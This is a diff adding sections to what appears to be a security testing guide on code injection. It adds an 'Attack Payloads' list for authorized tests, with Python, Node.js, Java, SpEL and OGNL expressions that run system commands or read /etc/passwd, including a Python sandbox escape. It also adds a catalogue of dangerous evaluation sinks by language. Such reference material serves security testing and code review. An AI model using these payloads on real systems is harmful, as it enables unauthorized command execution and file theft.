@@ -30,6 +30,112 @@ In command injection, the attacker extends existing OS command execution. In cod
 | **Weak controls** | Sandbox claims without verified restrictions on imports, reflection, file I/O |
 | **Overlap with SSTI** | Template engines that compile user-supplied source at runtime |
 
+## Attack Payloads
+
+Use these in authorized tests when user input reaches an evaluator. Replace `TARGET` with the vulnerable parameter. Confirm the runtime language before relying on a single payload.
+
+### Pattern 1: Python expression and statement injection
+
+```python
+__import__('os').system('id')
+().__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('id')
+open('/etc/passwd').read()
+```
+
+### Pattern 2: JavaScript / Node eval
+
+```javascript
+process.mainModule.require('child_process').execSync('id')
+global.process.mainModule.require('fs').readFileSync('/etc/passwd')
+Function('return this')().constructor.constructor('return process')().mainModule.require('child_process').exec('id')
+```
+
+### Pattern 3: Java ScriptEngine / Groovy
+
+```java
+java.lang.Runtime.getRuntime().exec("id")
+new java.util.Scanner(new java.io.File("/etc/passwd")).useDelimiter("\\A").next()
+```
+
+### Pattern 4: Spring SpEL
+
+```text
+T(java.lang.Runtime).getRuntime().exec('id')
+#{T(java.lang.Runtime).getRuntime().exec('id')}
+${T(java.lang.Runtime).getRuntime().exec('id')}
+```
+
+### Pattern 5: OGNL (Struts-style)
+
+```text
+(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))
+(@java.lang.Runtime@getRuntime().exec('id'))
+```
+
+### Pattern 6: Deserialization and unsafe loaders (code execution paths)
+
+```python
+pickle.loads(user_bytes)
+yaml.load(user_yaml)  # PyYAML unsafe
+```
+
+## Language-Specific Sinks and Dangerous APIs
+
+Search for evaluation primitives that compile or execute user-supplied strings. Any path that concatenates request data into expression text is a review priority.
+
+### Python
+
+```python
+result = eval(user_expr)
+exec(user_code)
+compile(user_snippet, "<string>", "exec")
+pickle.loads(request.data)
+yaml.load(body)  # without Loader=SafeLoader
+```
+
+### Java
+
+```java
+ScriptEngine engine = new ScriptEngineManager().getEngineByName("javascript");
+engine.eval(userRule);
+ExpressionParser parser = new SpelExpressionParser();
+parser.parseExpression(userInput).getValue();
+Ognl.getValue(userExpr, context);
+```
+
+### C#
+
+```csharp
+CSharpScript.EvaluateAsync(userCode);
+Microsoft.JScript.Eval.JScriptEvaluate(userExpr, engine);
+Assembly.Load(userAssemblyBytes);
+```
+
+### JavaScript
+
+```javascript
+eval(req.body.expr);
+new Function(userCode)();
+vm.runInNewContext(userSnippet);
+require('vm').runInThisContext(userInput);
+```
+
+### Go
+
+```go
+// Less common — review plugin/script hooks and text/template misuse:
+plugin.Open(userPath)
+text/template.Must(template.New("t").Parse(userTemplate)).Execute(w, data)
+```
+
+### Shell (embedded interpreters)
+
+```bash
+python3 -c "$user_expr"
+node -e "$user_js"
+ruby -e "$user_ruby"
+```
+
 ## Sample Vulnerable Code in Python
 
 ```python
